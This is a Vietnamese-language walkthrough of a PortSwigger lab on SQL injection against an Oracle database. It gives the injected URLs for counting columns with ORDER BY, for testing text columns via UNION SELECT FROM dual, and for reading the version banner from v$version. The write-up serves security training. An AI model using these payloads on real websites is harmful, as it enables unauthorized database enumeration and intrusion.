# Lab: SQL injection attack, querying the database type and version on Oracle

### Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
![Require of Lab](/Images/sql6.1.png)

Yêu cầu của bài lab là trả về chuỗi phiên bản của dtb

Truy cập vào bài lab ta thấy đây là 1 website bán hàng, với từng danh mục như `Corporate gifts`, `Food & Drink`, `Gifts` và `Lifestyle`, `Pets`....
![Website](/Images/sql6.2.png)

Tương tự như các bài lab trước, đầu tiên ta phải xác định số cột được trả về bằng cách thay đổi URL bằng cách thêm vào chuỗi `'+ORDER+BY+2--`

> https://ace21f501e8eeb14c0c0215000c500dc.web-security-academy.net/filter?category=Pets%27+ORDER+BY+2--

![Product of Pets order by 2](/Images/sql6.3.png)

Tiếp tục thay đổi URL bằng chuỗi `'+ORDER+BY+3--` và nhận được thông báo lỗi, từ đó xác định số cột được trả về là 2.
> https://ace21f501e8eeb14c0c0215000c500dc.web-security-academy.net/filter?category=Pets%27+ORDER+BY+3--

![Product of Pets order by 3](/Images/sql6.4.png)

Sau khi xác định được số cột trả về, ta kiểm tra xem 2 cột có chứa văn bản hay không
> https://ace21f501e8eeb14c0c0215000c500dc.web-security-academy.net/filter?category=Pets'+UNION+SELECT+%27123%27,%27oef%27+FROM+dual--

Trên cơ sở dữ liệu Oracle, mọi câu lệnh SELECT phải chỉ định một bảng để chọn FROM. Nếu sử dụng tấn công UNION SELECT không truy vấn từ một bảng dữ liệu, thì sẽ vẫn cần bao gồm từ khóa FROM theo sau là một tên bảng hợp lệ.

Có một bảng tích hợp trên Oracle được gọi là dual có thể sử dụng cho mục đích này. 

Ví dụ: UNION SELECT 'abc' FROM dual

![Check value in column](/Images/sql6.5.png)

Sau khi xác định, được các cột đều chứa văn bản, tiếp theo sẽ lấy chuỗi phiên bản của dtb như sau
> https://ace21f501e8eeb14c0c0215000c500dc.web-security-academy.net/filter?category=Pets%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--

![Result](/Images/sql6.7.png)


<div align="right"> <i> Ngày 21 tháng 01 năm 2021 </i> </div>
